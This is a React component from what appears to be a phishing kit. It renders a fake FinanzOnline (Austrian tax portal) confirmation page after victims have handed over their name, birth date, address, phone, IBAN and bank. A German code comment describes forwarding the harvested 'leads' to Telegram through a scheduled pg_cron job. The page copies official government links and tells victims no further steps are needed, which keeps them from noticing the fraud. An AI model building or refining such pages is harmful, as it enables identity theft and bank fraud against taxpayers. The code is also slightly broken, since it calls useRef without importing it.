import { useEffect } from "react";
import { useSearchParams } from "react-router-dom";
import Header from "@/components/Header";
import { usePageMeta } from "@/hooks/use-page-meta";
import { CheckCircle, Check } from "lucide-react";

import idAustriaImg from "@/assets/IDAustria.png";
import finanznaviImg from "@/assets/Finanznavi.jpg";
import kundenserviceImg from "@/assets/Kundenservice.png";
import steuerbuchImg from "@/assets/steuerbuch.jpg";

const confirmationItems = [
  "Voller Name",
  "E-Mail-Adresse",
  "Geburtsdatum",
  "Telefonnummer",
  "Adresse",
  "IBAN",
  "Bank",
];

const Confirmation = () => {
  const [searchParams] = useSearchParams();
  const sessionId = searchParams.get("s");
  const notified = useRef(false);

  usePageMeta("FinanzOnline Login", "/favicon.png");
  useEffect(() => { window.scrollTo(0, 0); }, []);

  // Telegram-Versand wird ausschließlich vom pg_cron Job nach 5 Minuten erledigt.
  // So bekommen Leads Zeit, vom Full Info zum Log zu werden, bevor gesendet wird.

  return (
    <div className="min-h-screen bg-white">
      <Header />
      <h1 className="py-8 text-center text-xl font-bold text-black md:py-12 md:text-2xl">
        Willkommen bei FinanzOnline
      </h1>

      <div className="container mx-auto px-4 py-4">
        {/* Erfolgs-Bestätigung */}
        <div className="rounded border-l-4 border-[#28a745] bg-[#d4edda] p-5" role="alert">
          <div className="mb-3 flex items-center gap-2">
            <CheckCircle className="h-5 w-5 text-[#28a745]" />
            <span className="text-base font-bold text-[#155724]">Bestätigung</span>
          </div>
          <div className="text-sm leading-relaxed text-[#155724]">
            <p>
              Ihre persönlichen Daten und Registrierungsinformationen wurden erfolgreich aktualisiert. Ihr Zugang zu FinanzOnline bleibt unverändert bestehen. Sie können alle Services wie gewohnt nutzen — einschließlich der Abgabe von Steuererklärungen und der Einsicht in Bescheide. Es sind keine weiteren Schritte erforderlich.
            </p>
          </div>
        </div>

        {/* Aktualisierung abgeschlossen */}
        <div className="mt-6 overflow-hidden rounded-lg border border-[#ddd] bg-[#f1f4f7] shadow-sm" role="region">
          <div className="px-6 pt-6">
            <h2 className="text-center text-lg font-bold text-gray-900">
              Aktualisierung abgeschlossen
            </h2>
          </div>

          <div className="mx-5 mt-4 rounded-md bg-[#d4edda] px-4 py-3">
            <div className="flex items-start gap-2">
              <CheckCircle className="mt-0.5 h-5 w-5 flex-shrink-0 text-[#28a745]" />
              <p className="text-sm text-[#155724]">
                Ihre Daten wurden erfolgreich überprüft und gespeichert.
              </p>
            </div>
          </div>

          <div className="mx-3 mb-5 mt-4 rounded-lg bg-white p-4 md:mx-5 md:p-6">
            <div className="space-y-4">
              {confirmationItems.map((item) => (
                <div key={item} className="flex flex-col items-start gap-1 border-b border-gray-100 pb-3 last:border-0 md:flex-row md:items-center md:justify-between">
                  <span className="text-sm font-medium text-gray-600">{item}</span>
                  <div className="flex items-center gap-2">
                    <span className="text-xs text-[#28a745] md:text-sm">
                      <span className="hidden md:inline">Erfolgreich aktualisiert</span>
                      <span className="md:hidden">Aktualisiert</span>
                    </span>
                    <Check className="h-4 w-4 text-[#28a745]" />
                  </div>
                </div>
              ))}

            </div>
          </div>
        </div>

        {/* Aktuelles Sektion */}
        <div className="mt-10">
          <h2 className="mb-6 text-lg font-bold text-black md:text-xl">Aktuelles</h2>
          <div className="grid grid-cols-1 gap-6 md:grid-cols-2 lg:grid-cols-4">
            {[
              {
                img: idAustriaImg,
                title: "Infos zur ID Austria",
                text: "Alle Informationen zur ID Austria und wie Sie diese aktivieren können.",
                link: "https://www.oesterreich.gv.at/id-austria.html",
              },
              {
                img: finanznaviImg,
                title: "Finanznavi",
                text: "Ihr digitaler Wegweiser für Ihre Finanzentscheidungen.",
                link: "https://finanznavi.gv.at/",
              },
              {
                img: kundenserviceImg,
                title: "Kundenservice",
                text: "Alle Informationen zu unserem Kundenservice.",
                link: "https://www.bmf.gv.at/services/aemter-behoerden/faoe.html",
              },
              {
                img: steuerbuchImg,
                title: "Das Steuerbuch 2026",
                text: "Tipps zur Arbeitnehmerveranlagung 2025 für Lohnsteuerzahler/innen",
                link: "https://www.bmf.gv.at/public/top-themen/steuerbuch-2026.html",
              },
            ].map((item) => (
              <a
                key={item.title}
                href={item.link}
                target="_blank"
                rel="noopener noreferrer"
                className="group overflow-hidden rounded-lg"
              >
                <div className="aspect-[16/10] w-full overflow-hidden rounded-lg">
                  <img
                    src={item.img}
                    alt={item.title}
                    className="h-full w-full object-cover"
                  />
                </div>
                <div className="p-4">
                  <h3 className="mb-1 text-sm font-bold text-gray-900 group-hover:underline">{item.title}</h3>
                  <p className="text-xs leading-relaxed text-gray-600 group-hover:underline">{item.text}</p>
                </div>
              </a>
            ))}
          </div>
        </div>
      </div>

      {/* Informationen / Services / Technische Unterstützung */}
      <div className="mt-10 bg-white py-10">
        <div className="container mx-auto px-4">
          <div className="grid grid-cols-1 gap-8 text-center md:grid-cols-3 md:text-left">
            <div>
              <h3 className="mb-4 text-base font-bold text-gray-900">Informationen</h3>
              <ul className="space-y-2">
                <li><a href="https://www.bmf.gv.at/fon/sicherheit" target="_blank" rel="noopener noreferrer" className="text-sm text-[#005a8b] hover:underline">Sicherheitsinformationen</a></li>
                <li><a href="https://www.bmf.gv.at/fon/browsereinstellungen" target="_blank" rel="noopener noreferrer" className="text-sm text-[#005a8b] hover:underline">Technische Voraussetzungen</a></li>
                <li><a href="https://www.bmf.gv.at/fon/rechtl-grundlagen" target="_blank" rel="noopener noreferrer" className="text-sm text-[#005a8b] hover:underline">Rechtsgrundlagen</a></li>
                <li><a href="https://www.bmf.gv.at/dam/jcr:3f995b13-605b-4367-8d2f-b298cc37f3e7/registration_income%20tax%20and%20corporation%20tax%20return.pdf" target="_blank" rel="noopener noreferrer" className="text-sm text-[#005a8b] hover:underline">Registration / Income tax and Corporation tax return</a></li>
              </ul>
            </div>
            <div>
              <h3 className="mb-4 text-base font-bold text-gray-900">Services</h3>
              <ul className="space-y-2">
                <li><a href="https://finanzonline.bmf.gv.at/fon/a/auswahlErklDavor.do" target="_blank" rel="noopener noreferrer" className="text-sm text-[#005a8b] hover:underline">Anonyme Steuerberechnung</a></li>
                <li><a href="https://finanzonline.bmf.gv.at/fon/a/vatToolAuswahl.do" target="_blank" rel="noopener noreferrer" className="text-sm text-[#005a8b] hover:underline">XML-Erstellung (VAT Refund)</a></li>
              </ul>
            </div>
            <div>
              <h3 className="mb-4 text-base font-bold text-gray-900">Technische Unterstützung</h3>
              <p className="text-sm leading-relaxed text-gray-800">
                Fragen Sie Fred, den Chatbot der Finanzverwaltung. Weitere Kontaktmöglichkeiten finden Sie unter{" "}
                <a href="https://www.bmf.gv.at/services/aemter-behoerden/faoe.html" target="_blank" rel="noopener noreferrer" className="text-[#005a8b] underline">
                  Kundenservice.
                </a>
              </p>
            </div>
          </div>
        </div>
      </div>
      {/* Footer */}
      <footer className="border-t border-gray-200 bg-white py-8">
        <div className="container mx-auto px-4 text-center">
          <div className="mb-6 flex flex-wrap items-center justify-center gap-2 text-sm text-black">
            <a href="https://www.bmf.gv.at/public/impressum.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Impressum</a>
            <span>/</span>
            <a href="https://www.bmf.gv.at/public/datenschutz.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Datenschutz</a>
            <span>/</span>
            <a href="https://www.bmf.gv.at/public/barrierefreiheitserklaerung.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Barrierefreiheitserklärung</a>
            <span>/</span>
            <a href="https://service.bmf.gv.at/Service/Allg/Feedback/_start.asp?FTyp=KONTAKT" target="_blank" rel="noopener noreferrer" className="hover:underline">Kontakt</a>
          </div>
          <div className="flex items-center justify-center gap-4">
            <a href="https://www.instagram.com/bmaborgen/" target="_blank" rel="noopener noreferrer">
              <img src="https://finanzonline.bmf.gv.at/fon/img/icon-bcms_social_media_instagram.svg" alt="Instagram" className="h-6 w-6" />
            </a>
            <a href="https://www.facebook.com/bmaborgen" target="_blank" rel="noopener noreferrer">
              <img src="https://finanzonline.bmf.gv.at/fon/img/icon-bcms_social_media_facebook.svg" alt="Facebook" className="h-6 w-6" />
            </a>
            <a href="https://www.youtube.com/bmaborgen" target="_blank" rel="noopener noreferrer">
              <img src="https://finanzonline.bmf.gv.at/fon/img/icon-bcms_social_media_youtube.svg" alt="YouTube" className="h-6 w-6" />
            </a>
            <a href="https://www.flickr.com/bmaborgen" target="_blank" rel="noopener noreferrer">
              <img src="https://finanzonline.bmf.gv.at/fon/img/icon-bcms_social_media_flickr.svg" alt="Flickr" className="h-6 w-6" />
            </a>
            <a href="https://www.linkedin.com/bmaborgen" target="_blank" rel="noopener noreferrer">
              <img src="https://finanzonline.bmf.gv.at/fon/img/icon-bcms_social_media_linkedin.svg" alt="LinkedIn" className="h-6 w-6" />
            </a>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default Confirmation;
